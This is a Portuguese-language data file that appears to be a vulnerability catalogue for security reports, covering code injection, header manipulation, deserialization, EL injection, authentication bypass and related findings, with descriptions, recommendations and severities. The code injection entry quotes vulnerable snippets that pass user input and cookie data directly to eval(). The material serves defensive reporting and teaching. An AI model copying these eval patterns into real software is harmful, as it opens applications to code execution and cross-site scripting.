;Data Source Type;Data Source Key;Vulnerabilidade;Descrição;Outras observações técnicas;Recomendação - Título;Recomendação;Causa raíz;CAT1 - CONTROLE;CAT2 - OWASP;Severidade;Risco (Tags);Referência 1;Referência 2;;;;;;;;;;;;;;
V;;;Code injection;"Muitas linguagens de programação modernas são capazes de interpretação de instruções de código em tempo de execução. Essa capacidade permite aos programadores executar instruções dinâmicas através de campos de entrada de dados inseridas pelo usuário.A vulnerabilidade de Injeção de Código acontece quando o programador incorretamente assume que toda instrução fornecida pelo usuário será apenas para ações esperadas como por exemplo um cálculo simples ou modificação de um status do usuário.No entanto, sem a validação apropriada, o usuário poderia enviar instruções de código que o programador não pretendia que fossem executadas. Por exemplo: Num caso clássico de Injeção de Código, a aplicação implementa uma calculadora básica que permite ao usuário definir o comando a ser executado....userOp = form.operation.value;calcResult = eval(userOp);...O programa funciona como planejado quando o parâmetro inserido é um valor benigno, como ""8 + 7 * 2"", que resultaria num valor ""22"" inserido na variável calcResult. Mas, se o usuário mal-intencionado inserir uma operação válida (e maliciosa) para a linguagem de programação usada, a operação seria executada com sucesso no nível de permissão do processo pai.No caso de a linguagem usada ser o Java Script, usuário mal-intencionado seria capaz de realizar ataques de Cross-site Scripting.Outro exemplo de código vulnerável seria:oData = eval( '('+decodeURIComponent(aSplitCookie[1])+')' );""";-;Code injection;-;-;;;;;;;;;;;;;;;;;;;;
V;;;Cookies Header Manipulation;A inclusão de dados não validados em Cookies pode resultar na manipulação de cabeçalho de Respostas HTTP, além de permitir ataques como envenenamento de cache, Cross-Site Scripting, sequestro de páginas, manipulação de cookies ou redirecionamento aberto.;-;Cookies Header Manipulation;"A manipulação de cabeçalho do cookie, ocorre quando um usuário mal-intencionado inclui dados maliciosos em sua saída. Por isso deve-se validar os dados imediatamente, antes que eles deixem o aplicativo. A abordagem mais segura para a validação de Manipulação de Cabeçalho é criar um white list de caracteres seguros que podem aparecer em cabeçalhos de respostas HTTP e aceitar entradas formadas exclusivamente por caracteres do conjunto aprovado. Por exemplo, um nome válido pode incluir somente caracteres alfanuméricos, ou um número de conta pode incluir somente dígitos de 0 a 9.Uma abordagem mais flexível, mas menos segura, é conhecida como ""black list"", que faz a rejeição ou o escape seletivo de caracteres potencialmente perigosos antes de usar os dados. Para formar uma lista desse tipo, primeiro você precisa compreender o conjunto de caracteres que têm significado especial em cabeçalhos de respostas HTTP. Embora os caracteres de CR e LF estejam no centro de um ataque de divisão de respostas HTTP, outros caracteres, como ':' (dois pontos) e '=' (sinal de igual), também têm significado especial em cabeçalhos de respostas.Depois que você identificar os pontos corretos em um aplicativo para realizar a validação de ataques de Manipulação de Cabeçalho e especificar quais caracteres especiais devem ser levados em consideração por essa validação, o próximo desafio é identificar como ela lida com caracteres especiais. O aplicativo deve rejeitar qualquer entrada destinada a inclusão em cabeçalhos de respostas HTTP que contêm caracteres especiais, particularmente CR e LF, marcando essa entrada como inválida.";-;;;;;;;;;;;;;;;;;;;;
V;;;Descoberta de caminho local;"Esta vulnerabilidade permite que um usuário mal-intencionado veja o caminho para o webroot / arquivo. Ex.: /home/ omg/ htdocs/ Certas vulnerabilidades, como o uso da função load_file() (dentro de uma injeção de SQL) para ver o código fonte da página, exige que o usuário mal-intencionado tenha o caminho completo para o arquivo que deseja visualizar. Os riscos relativos a esta vulnerabilidade pode produzir vários resultados. Por exemplo, se o webroot está exposto, os usuário mal-intencionados podem utilizar esta informação e usá-lo em combinação com vulnerabilidades de inclusão de arquivos para roubar arquivos de configuração em relação à aplicação web ou no sistema operacional.";-;Descoberta de caminho local;-;-;;;;;;;;;;;;;;;;;;;;
;;;A aplicação está suscetível a desserialização;Serialização é o processo de transformar algum objeto em um formato de dados que pode ser restaurado posteriormente. As pessoas costumam serializar objetos<br/>para salvá-los no armazenamento ou para enviar como parte das comunicações. <br/>A desserialização é o inverso desse processo - levando dados estruturados de algum formato e reconstruindo-os em um objeto. <br/><br/>No entanto, muitas linguagens de programação oferecem um recurso nativo para serializar objetos. Esses formatos nativos geralmente oferecem mais recursos <br/>do que JSON ou XML, incluindo a personalização do processo de serialização. Infelizmente, os recursos desses mecanismos de desserialização nativos<br/>podem ser redefinidos para efeito mal-intencionado ao operar em dados não confiáveis. Ataques contra deserializers foram encontrados para permitir ataques de negação de serviço, controle de acesso e execução remota de código.;;A aplicação está suscetível a desserialização;O único padrão arquitetural seguro é não aceitar serializado<br/>objetos de fontes não confiáveis __ou para usar mídias de serialização<br/>que apenas permitem tipos de dados primitivos.<br/>Se isso não for possível, considere um dos seguintes procedimentos:<br/><br/>* Implementar verificações de integridade, como assinaturas digitais, em qualquer<br/>objetos serializados para impedir a criação ou os dados de objetos hostis<br/>Adulteração.<br/><br/>* Impondo restrições restritas de tipo durante a desserialização antes<br/>criação de objeto como o código normalmente espera um conjunto definível de<br/>classes. Bypasses a esta técnica foram demonstrados,<br/>então confiar apenas nisso não é aconselhável.<br/><br/>* Isolando e executando código que desserializa em baixo privilégio<br/>ambientes quando possível.<br/><br/>* Registrando exceções e falhas de desserialização, como onde<br/>o tipo de entrada não é o tipo esperado, ou o<br/>desserialização gera exceções.<br/><br/>* Restringindo ou monitorando a rede de entrada e saída<br/>conectividade de contêineres ou servidores que desserializam.<br/><br/>* Monitorando a desserialização, alertando se um usuário desserializa<br/>constantemente.<br/><br/>;-;;;CRITICAL;;;;;;;;;;;;;;;;;
;;;A aplicação está vulnerável a expression language injection;Foi identificado que a aplicação não está validando de forma <br/><br/>correta as requisições submetidas ao servidor. Por meio de variáveis <br/><br/>vulneráveis na aplicação, é possível executar scripts maliciosos, sendo <br/><br/>os mesmos de forma remota. Isto pode manipular a funcionalidade do <br/><br/>aplicativo, expor dados confidenciais e representar riscos de <br/><br/>indisponibilidade dos serviços.<div><br></div>;;A aplicação está vulnerável a expression language injection;"Aplicar as melhores práticas de validação de entrada para garantir que não haja caracteres meta EL ( ""$ {"" e ""# {"") na entrada.";-;;;HIGH;;;;;;;;;;;;;;;;;
;;;A aplicação está vulnerável a injeção de código.;Foi observado que a aplicação encontra-se vulnerável a code injection, de modo que foi possível executar códigos maliciosos no servidor, códigos que executam comando do sistema operacional.<br/><br/>Esta vulnerabilidade é explorada por meio de variáveis vulneráveis e ocorre devido a utilização de funções vulneráveis da própria linguagem de programação ou erros no próprio código fonte.;;A aplicação está vulnerável a injeção de código.;"Para mitigar ataques por injeção de códigos maliciosos devem-se:<br/><br/><br/><br/>- Evitar variáveis vulneráveis na linguagem de programação adotada;<br/><br/>- Deve-se revisar o código fonte das páginas, a fim de corrigir erros de programação;<br/><br/>- Caracteres especiais devem ser filtrados;<br/><br/>- Deve ser construído um script de validação dos dados requisitados pelo cliente.<br/><br/><br/><br/>Referência:<br/><br/>http://www.owasp.org/index.php/Interpreter_Injection#Code_Injection<br/><br/>http://www.owasp.org/index.php/Data_Validation";-;;;HIGH;;;;;;;;;;;;;;;;;
;;;A aplicação permite realizar bypass da autenticação;É possível realizar burlar o mecanismo de autenticação e acessar diretórios e/ou arquivos de configurações de sistema.;;A aplicação permite realizar bypass da autenticação;Restringir o acesso conforme recomendações do fornecedor.;-;;;HIGH;;;;;;;;;;;;;;;;;
;;;Anexo malicioso em mensagens SOAP;Devido a falta de verificação da confiabilidade do arquivo ou string colocada em upload na mensagem SOAP, foi possível realizar o upload de uma script trojada.;;Anexo malicioso em mensagens SOAP;Deve ser implementado na rede e computadores, dispositivos e sistemas de segurança que possam verificar a confiabilidade do arquivo ou string trafegada entre o Web Services e o Banco de dados, a fim de bloquear todo tráfego malicioso.<br/><br/><br/><br/>Dispositivos e softwares a serem instalados:<br/><br/>- IDS, IPS, Firewall/Proxy e Antivírus.;-;;;HIGH;;;;;;;;;;;;;;;;;
;;Comunicação insegura entre cliente e servidor (HTTPS);Aplicação acessível via HTTP;"<span><span style=""color:black"">A aplicação está com o HTTPS habilitado,<br/><br/> porém ainda permite o uso do HTTP quando o cliente faz uma requisição <br/><br/>explícita usando esse protocolo. Essa situação torna a comunicação entre<br/><br/> o cliente e o servidor insegura, forçando o tráfego das informações em <br/><br/>texto claro.</span></span>";;Aplicação acessível via HTTP;"<span><span style=""color:black"">Em páginas e aplicações em que trafeguem<br/><br/> informações sensíveis, deve-se desabilitar o uso do HTTP sem <br/><br/>criptografia. Mesmo que o cliente force uma comunicação desse tipo, a <br/><br/>aplicação deve redirecionar para um canal de comunicação seguro com <br/><br/>HTTPS.</span></span>";-;;;MEDIUM;;;;;;;;;;;;;;;;;
;;;Armazenamento inseguro de dados;"Informações confidências estão armazenados de forma insegura no servidor.<span class=""Apple-tab-span"" style=""white-space:pre""></span>";;Armazenamento inseguro de dados;Não permitir o processamento, armazenamento e transmissão destas informações.;-;;;HIGH;;;;;;;;;;;;;;;;;
